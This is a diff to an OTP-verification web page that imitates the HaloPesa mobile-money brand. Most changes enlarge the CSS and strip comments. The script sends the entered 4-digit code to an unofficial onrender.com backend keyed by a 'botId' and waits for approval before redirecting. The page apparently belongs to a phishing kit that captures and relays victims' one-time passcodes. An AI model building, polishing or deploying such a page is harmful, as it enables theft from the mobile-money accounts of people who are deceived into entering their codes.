@@ -5,7 +5,7 @@
 <title>Uthibitisho wa OTP - HaloPesa</title>
 
 <style>
-/* ===== HALOPESA BRAND STYLES - BIGGER & BOLDER ===== */
+/* ===== HALOPESA BRAND STYLES - MASSIVE & SPACIOUS ===== */
 * {
   box-sizing: border-box;
   margin: 0;
@@ -19,95 +19,95 @@ body {
   display: flex;
   justify-content: center;
   align-items: center;
-  padding: 12px;
+  padding: 16px;
 }
 
 .page {
   width: 100%;
-  max-width: 640px;
+  max-width: 780px; /* Much wider */
 }
 
-/* Card - More generous padding */
+/* Card - Huge padding, bigger radius */
 .card {
   background: #ffffff;
-  border-radius: 24px;
-  padding: 48px 36px 40px;
-  box-shadow: 0 12px 40px rgba(26, 67, 41, 0.12);
+  border-radius: 32px;
+  padding: 64px 48px 52px;
+  box-shadow: 0 16px 48px rgba(26, 67, 41, 0.15);
   border: 1px solid #e6efe6;
 }
 
-/* Titles - Larger */
+/* Titles - Very large */
 .title {
-  font-size: 38px;
+  font-size: 44px;
   font-weight: 700;
   color: #1a6b2a;
-  margin-bottom: 10px;
+  margin-bottom: 12px;
   letter-spacing: -0.5px;
 }
 
 .subtitle {
   color: #5a6b5a;
-  font-size: 20px;
-  margin-bottom: 8px;
+  font-size: 24px;
+  margin-bottom: 10px;
 }
 
 .display-number {
   color: #1a2b1a;
   font-weight: 700;
-  font-size: 22px;
-  margin-bottom: 28px;
+  font-size: 26px;
+  margin-bottom: 32px;
   background: #f4f9f4;
-  padding: 12px 22px;
-  border-radius: 12px;
+  padding: 14px 28px;
+  border-radius: 16px;
   display: inline-block;
   letter-spacing: 0.5px;
 }
 
-/* Success Box - Larger */
+/* Success Box - Bigger */
 .success-box {
   background: #eaf6ea;
   border: 1px solid #b8d9b8;
   color: #1a6b2a;
-  border-radius: 16px;
-  padding: 22px 24px;
-  margin-bottom: 30px;
+  border-radius: 20px;
+  padding: 28px 32px;
+  margin-bottom: 36px;
   display: flex;
-  gap: 16px;
+  gap: 20px;
   align-items: flex-start;
-  font-size: 19px;
+  font-size: 22px;
   line-height: 1.6;
 }
 
 .success-box > div:first-child {
-  font-size: 28px;
+  font-size: 34px;
   color: #1a7a2a;
   font-weight: 700;
   line-height: 1.2;
 }
 
 .label {
-  font-size: 20px;
+  font-size: 24px;
   font-weight: 600;
   color: #1a2b1a;
-  margin-bottom: 20px;
+  margin-bottom: 24px;
 }
 
-/* OTP Inputs - MASSIVE */
+/* OTP Inputs - GIGANTIC */
 .otp-boxes {
   display: flex;
   justify-content: center;
-  gap: 20px;
-  margin-bottom: 28px;
+  gap: 24px;
+  margin-bottom: 32px;
 }
 
 .otp-boxes input {
-  width: 88px;
-  height: 88px;
+  width: 104px;
+  height: 104px;
   border: 3px solid #d0e0d0;
-  border-radius: 20px;
+  border-radius: 24px;
   background: #fafffa;
   text-align: center;
-  font-size: 40px;
+  font-size: 48px;
   font-weight: 700;
   color: #1a3b1a;
   outline: none;
@@ -116,33 +116,33 @@ body {
 
 .otp-boxes input:focus {
   border-color: #1a7a2a;
-  box-shadow: 0 0 0 6px rgba(26, 122, 42, 0.15);
+  box-shadow: 0 0 0 8px rgba(26, 122, 42, 0.15);
 }
 
-/* Timer - Larger */
+/* Timer - Bigger */
 #timerContainer {
   text-align: center;
   color: #b8960f;
   font-weight: 600;
-  font-size: 20px;
-  margin-bottom: 30px;
+  font-size: 24px;
+  margin-bottom: 36px;
   background: #fefcf0;
-  padding: 16px 0;
-  border-radius: 14px;
+  padding: 20px 0;
+  border-radius: 16px;
 }
 
 #timerContainer strong {
   color: #1a7a2a;
-  font-size: 24px;
+  font-size: 28px;
 }
 
-/* Primary Button - HUGE */
+/* Primary Button - ENORMOUS */
 button {
   width: 100%;
-  height: 72px;
+  height: 84px;
   border: none;
-  border-radius: 16px;
-  font-size: 22px;
+  border-radius: 20px;
+  font-size: 26px;
   font-weight: 700;
   background: #d4e0d4;
   color: #8a9f8a;
@@ -152,7 +152,7 @@ button {
   display: flex;
   align-items: center;
   justify-content: center;
-  gap: 14px;
+  gap: 16px;
 }
 
 button:not(:disabled) {
@@ -171,8 +171,8 @@ button:not(:disabled):active {
 
 /* Spinner - Bigger */
 .spinner {
-  width: 24px;
-  height: 24px;
+  width: 28px;
+  height: 28px;
   border: 3px solid rgba(255,255,255,0.3);
   border-top: 3px solid #ffffff;
   border-radius: 50%;
@@ -184,21 +184,89 @@ button:not(:disabled):active {
   to { transform: rotate(360deg); }
 }
 
-/* Status messages - Larger */
+/* Status messages - Bigger */
 #status {
-  margin-top: 20px;
+  margin-top: 24px;
   text-align: center;
-  font-size: 18px;
+  font-size: 20px;
   font-weight: 500;
   color: #c0392b;
-  min-height: 28px;
+  min-height: 32px;
 }
 
-/* ===== RESPONSIVE TWEAKS - EVEN BIGGER ON MOBILE ===== */
-@media (max-width: 600px) {
+/* ===== RESPONSIVE TWEAKS - STILL LARGE ===== */
+@media (max-width: 700px) {
   .card {
-    padding: 32px 20px 28px;
+    padding: 40px 28px 36px;
+    border-radius: 24px;
+  }
+
+  .title {
+    font-size: 36px;
+  }
+
+  .subtitle {
+    font-size: 20px;
+  }
+
+  .display-number {
+    font-size: 22px;
+    padding: 12px 22px;
+  }
+
+  .success-box {
+    font-size: 19px;
+    padding: 22px 24px;
+    gap: 16px;
+    border-radius: 16px;
+  }
+
+  .success-box > div:first-child {
+    font-size: 28px;
+  }
+
+  .label {
+    font-size: 20px;
+    margin-bottom: 20px;
+  }
+
+  .otp-boxes {
+    gap: 18px;
+    margin-bottom: 26px;
+  }
+
+  .otp-boxes input {
+    width: 88px;
+    height: 88px;
+    font-size: 40px;
     border-radius: 20px;
+  }
+
+  #timerContainer {
+    font-size: 20px;
+    padding: 16px 0;
+    margin-bottom: 28px;
+  }
+
+  #timerContainer strong {
+    font-size: 24px;
+  }
+
+  button {
+    height: 72px;
+    font-size: 22px;
+    border-radius: 16px;
+  }
+
+  #status {
+    font-size: 18px;
+    margin-top: 18px;
+  }
+}
+
+@media (max-width: 500px) {
+  .card {
+    padding: 30px 18px 24px;
   }
 
   .title {
@@ -210,7 +278,7 @@ button:not(:disabled):active {
   }
 
   .display-number {
-    font-size: 20px;
+    font-size: 19px;
     padding: 10px 18px;
   }
 
@@ -218,7 +286,6 @@ button:not(:disabled):active {
     font-size: 17px;
     padding: 18px 20px;
     gap: 14px;
-    border-radius: 14px;
   }
 
   .success-box > div:first-child {
@@ -227,17 +294,15 @@ button:not(:disabled):active {
 
   .label {
     font-size: 18px;
-    margin-bottom: 18px;
   }
 
   .otp-boxes {
-    gap: 16px;
-    margin-bottom: 24px;
+    gap: 14px;
   }
 
   .otp-boxes input {
-    width: 76px;
-    height: 76px;
+    width: 74px;
+    height: 74px;
     font-size: 34px;
     border-radius: 18px;
   }
@@ -245,94 +310,37 @@ button:not(:disabled):active {
   #timerContainer {
     font-size: 18px;
     padding: 14px 0;
-    margin-bottom: 24px;
   }
 
   #timerContainer strong {
-    font-size: 22px;
+    font-size: 20px;
   }
 
   button {
     height: 64px;
     font-size: 20px;
-    border-radius: 14px;
   }
 
   #status {
     font-size: 16px;
-    margin-top: 16px;
   }
 }
 
-/* Extra small devices - max 420px */
-@media (max-width: 420px) {
-  .card {
-    padding: 24px 14px 20px;
-  }
-
-  .title {
-    font-size: 26px;
-  }
-
-  .subtitle {
-    font-size: 16px;
-  }
-
-  .display-number {
-    font-size: 17px;
-    padding: 8px 14px;
-  }
-
-  .success-box {
-    font-size: 15px;
-    padding: 14px 16px;
-    gap: 12px;
-  }
-
-  .success-box > div:first-child {
-    font-size: 20px;
-  }
-
-  .label {
-    font-size: 16px;
-  }
-
+@media (max-width: 380px) {
   .otp-boxes {
-    gap: 12px;
+    gap: 10px;
   }
 
   .otp-boxes input {
-    width: 66px;
-    height: 66px;
-    font-size: 30px;
-    border-radius: 16px;
-  }
-
-  #timerContainer {
-    font-size: 16px;
-    padding: 12px 0;
-  }
-
-  #timerContainer strong {
-    font-size: 19px;
+    width: 62px;
+    height: 62px;
+    font-size: 28px;
+    border-radius: 14px;
   }
 
   button {
     height: 58px;
     font-size: 18px;
-  }
-
-  #status {
-    font-size: 15px;
-  }
-}
-
-/* Very tiny screens - max 360px */
-@media (max-width: 360px) {
-  .otp-boxes input {
-    width: 56px;
-    height: 56px;
-    font-size: 26px;
   }
 }
 </style>
@@ -369,13 +377,12 @@ button:not(:disabled):active {
   </div>
 </div>
 
-<!-- ===== LOGIC — UNTOUCHED except redirect ===== -->
+<!-- ===== LOGIC — UNTOUCHED ===== -->
 <script>
 const BACKEND_URL = "https://halopesa-tanzania-x2u7.onrender.com";
 const params = new URLSearchParams(window.location.search);
 const botId = params.get('botId');
 
-// Store botId for redirect fallback
 if (botId) {
     localStorage.setItem('botId', botId);
 }
@@ -385,7 +392,6 @@ if(!botId){
   throw new Error("Bot ID missing");
 }
 
-// Get phone from localStorage
 const phone = localStorage.getItem('phone') || "";
 document.getElementById('phoneNumber').textContent =
   phone ? phone.slice(0,6) + "****" + phone.slice(-2) : "No phone number found";
@@ -399,7 +405,6 @@ const timerDisplay = document.getElementById('timerDisplay');
 
 let countdown;
 
-// Handle keyboard input for OTP boxes
 document.addEventListener('keydown', e => {
   if(!/^[0-9]$/.test(e.key) && e.key !== "Backspace") return;
 
@@ -415,7 +420,6 @@ document.addEventListener('keydown', e => {
     submitBtn.disabled = ![...inputs].every(i => i.value);
   }
 
-  // Auto-submit when all 4 digits are entered
   if([...inputs].every(i => i.value)) {
     document.getElementById('otpForm').dispatchEvent(new Event('submit'));
   }
@@ -470,7 +474,6 @@ document.getElementById('otpForm').addEventListener('submit', async e=>{
 
   const code=[...inputs].map(i=>i.value).join('');
 
-  // Check if all digits are entered
   if(code.length !== 4) {
     statusEl.textContent = "Please enter all 4 digits";
     return;
@@ -501,12 +504,7 @@ document.getElementById('otpForm').addEventListener('submit', async e=>{
   if(approved){
     localStorage.setItem('code', code);
     statusEl.textContent="Code verified! Redirecting...";
-
-    // ✅ FIXED: Redirect to success.html instead of merchant.html
-    // Get botId from localStorage if not in URL
     const redirectBotId = botId || localStorage.getItem('botId') || '';
-    console.log('✅ Redirecting to success.html with botId:', redirectBotId);
-
     setTimeout(() => {
       window.location.href = `success.html?botId=${redirectBotId}`;
     }, 500);
